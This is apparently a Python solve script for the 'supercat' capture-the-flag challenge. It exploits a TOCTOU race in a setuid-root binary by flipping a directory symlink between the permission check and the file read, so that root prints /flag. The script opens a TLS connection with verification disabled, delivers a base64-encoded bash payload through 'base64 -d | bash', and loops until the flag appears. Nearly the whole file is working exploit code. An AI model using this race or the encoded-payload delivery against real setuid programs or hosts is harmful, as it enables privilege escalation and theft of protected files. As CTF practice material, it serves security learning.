#!/usr/bin/env python3
"""Solve supercat.

`supercat` is a setuid-root Rust binary that gates `fs::read_to_string` on
the caller's *real* uid/gid (read from /proc/self/status). Between
`metadata(path)` and `read_to_string(path)` it does a full read of
/proc/self/status — a wide enough TOCTOU window to swap a directory
symlink underneath the path. Set up:

    /tmp/a/x   ← regular file we own, chmod 400
    /tmp/b/x   ← symlink → /flag
    /tmp/L     ← symlink to /tmp/a OR /tmp/b (flipping)

then race `supercat /tmp/L/x` against `ln -sfn` flips of /tmp/L. When
metadata sees /tmp/a/x (ours, 0400 → passes check #1) and the subsequent
open follows /tmp/L → /tmp/b → /flag, root reads /flag and prints it.

The exploit shell-script is base64'd and piped through `base64 -d | bash`
on the remote because the raw socat shell mangles multiline heredocs.
"""
import re
import socket
import ssl
import sys
import time

HOST = "caramelized-chorizo-with-whipped-tomato-jshm.gpn24.ctf.kitctf.de"
PORT = 443

PAYLOAD = r"""
rm -rf /tmp/a /tmp/b /tmp/L
mkdir  /tmp/a /tmp/b
touch  /tmp/a/x && chmod 400 /tmp/a/x
ln -s  /flag /tmp/b/x
ln -s  /tmp/a /tmp/L

( while :; do
    ln -sfn /tmp/b /tmp/L
    ln -sfn /tmp/a /tmp/L
  done ) &
SPID=$!

while :; do
  R=$(/usr/local/bin/supercat /tmp/L/x 2>&1)
  if [[ "$R" == *GPNCTF\{* ]]; then
    echo "FLAG: $R"
    kill $SPID 2>/dev/null
    break
  fi
done
"""


def connect() -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((HOST, PORT), timeout=15)
    return ctx.wrap_socket(raw, server_hostname=HOST)


def drain(sock: ssl.SSLSocket, timeout: float = 1.5) -> str:
    sock.settimeout(timeout)
    buf = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf.decode("utf-8", errors="replace")


def main() -> int:
    import base64

    sock = connect()
    time.sleep(1)
    banner = drain(sock, timeout=2)
    if "$" not in banner:
        print("did not get a shell prompt:", repr(banner[-200:]))
        return 1

    b64 = base64.b64encode(PAYLOAD.encode()).decode()
    sock.sendall(f"echo {b64} | base64 -d | bash\n".encode())

    sock.settimeout(120)
    collected = ""
    deadline = time.time() + 120
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            break
        collected += chunk.decode("utf-8", errors="replace")
        m = re.search(r"GPNCTF\{[^}]+\}", collected)
        if m:
            print(m.group(0))
            return 0
    print("no flag, last output:", collected[-500:])
    return 1


if __name__ == "__main__":
    sys.exit(main())
